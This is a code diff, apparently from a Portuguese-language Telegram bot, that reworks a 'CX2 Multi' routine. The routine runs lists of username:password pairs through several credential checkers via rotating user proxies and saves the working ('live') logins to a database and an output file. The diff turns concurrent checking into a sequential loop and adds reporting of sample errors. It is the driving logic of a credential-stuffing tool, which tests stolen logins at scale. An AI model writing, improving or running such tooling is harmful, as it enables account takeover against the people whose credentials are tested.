@@ -1234,7 +1234,7 @@ async def _run_cx2(chat_id, uid, lines, delim, app):
         total_creds = len(lines)
         total_chk   = len(CHECKERS)
         all_lives:  list[str] = []
-        state       = {"done": 0}
+        all_erros:  list[str] = []
         px_count    = len(get_user_proxies(uid))
         urow        = _db("SELECT username FROM users WHERE user_id=?", uid, fetch="one")
         uname       = (urow[0] if urow and urow[0] else None) or str(uid)
@@ -1245,40 +1245,35 @@ async def _run_cx2(chat_id, uid, lines, delim, app):
             parse_mode="Markdown",
         )
 
-        for ck_key, ck_name in CHECKERS.items():
+        def px_fn():
+            return _proxy_for(uid)
+
+        for idx, (ck_key, ck_name) in enumerate(CHECKERS.items(), 1):
             try:
                 await prog.edit_text(
-                    f"🔀 *CX2 Multi* · {state['done']+1}/{total_chk}\n"
+                    f"🔀 *CX2* · {idx}/{total_chk}\n"
                     f"`▶ {ck_name}` · lives: `{len(all_lives)}`",
                     parse_mode="Markdown",
                 )
             except Exception:
                 pass
 
-            fn        = CHECKER_FN[ck_key]
-            ck_lives: list[str] = []
-            inner_sem = asyncio.Semaphore(5)
+            fn = CHECKER_FN[ck_key]
 
-            async def _proc_cx2(line, fn=fn, ck_name=ck_name, ck_lives=ck_lives):
+            for line in lines:
                 parts = line.split(delim, 1)
                 if len(parts) < 2:
-                    return
+                    continue
                 user, pwd = parts[0].strip(), parts[1].strip()
                 if not user or not pwd:
-                    return
-                result, extra = await asyncio.to_thread(fn, user, pwd, lambda: _proxy_for(uid))
+                    continue
+                result, extra = await asyncio.to_thread(fn, user, pwd, px_fn)
                 if result == "live":
                     entry = f"[{ck_name}] {user}:{pwd}" + (f" | {extra}" if extra else "")
-                    ck_lives.append(entry)
+                    all_lives.append(entry)
                     cx2_save(uid, uname, ck_name, entry)
-
-            async def _inner(line):
-                async with inner_sem:
-                    await _proc_cx2(line)
-
-            await asyncio.gather(*[_inner(l) for l in lines])
-            all_lives.extend(ck_lives)
-            state["done"] += 1
+                elif result == "erro" and len(all_erros) < 5:
+                    all_erros.append(f"[{ck_name}] {extra}")
 
         summary = (
             f"✅ *CX2 Multi* concluído!\n"
@@ -1290,6 +1285,13 @@ async def _run_cx2(chat_id, uid, lines, delim, app):
             f"```"
         )
         await prog.edit_text(summary, parse_mode="Markdown")
+
+        if all_erros:
+            await app.bot.send_message(
+                chat_id,
+                "⚠️ *Amostra de erros:*\n" + "\n".join(f"• `{e}`" for e in all_erros),
+                parse_mode="Markdown",
+            )
 
         if all_lives:
             out = TMP_DIR / f"cx2_{uid}_{int(time.time())}.txt"
